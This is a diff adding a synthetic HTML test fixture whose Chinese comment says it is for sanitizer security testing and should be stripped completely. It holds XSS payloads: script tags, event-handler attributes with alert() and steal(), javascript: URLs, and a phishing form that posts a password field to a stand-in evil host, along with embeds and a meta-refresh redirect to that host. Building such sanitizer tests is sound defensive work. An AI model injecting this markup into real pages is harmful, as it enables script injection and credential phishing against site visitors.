@@ -1,0 +1,15 @@
+<!-- 合成样本：恶意构造（安全测试专用）。应被全部清洗：script/iframe/form/svg/事件属性/javascript:/CSS url()/position:fixed。 -->
+<section style="position: fixed; top: 0; left: 0; z-index: 9999; background: url(javascript:alert(1));">
+  <p onclick="alert('xss')" onmouseover="steal()" style="color: red; position: sticky;">事件属性段落</p>
+  <script>alert('script inject')</script>
+  <iframe src="https://evil.synthetic.example/hidden"></iframe>
+  <object data="https://evil.synthetic.example/x"></object>
+  <form action="https://evil.synthetic.example/phish"><input type="text" name="pw"><button>提交</button></form>
+  <svg onload="alert('svg')"><circle r="1"></circle></svg>
+  <a href="javascript:alert(1)">危险链接</a>
+  <a href="https://ok.synthetic.example" target="_self">正常链接</a>
+  <img src="x" onerror="alert('img')" alt="恶意图">
+  <video src="https://evil.synthetic.example/v.mp4"></video>
+  <style>body { background: red; }</style>
+  <meta http-equiv="refresh" content="0;url=https://evil.synthetic.example/">
+</section>
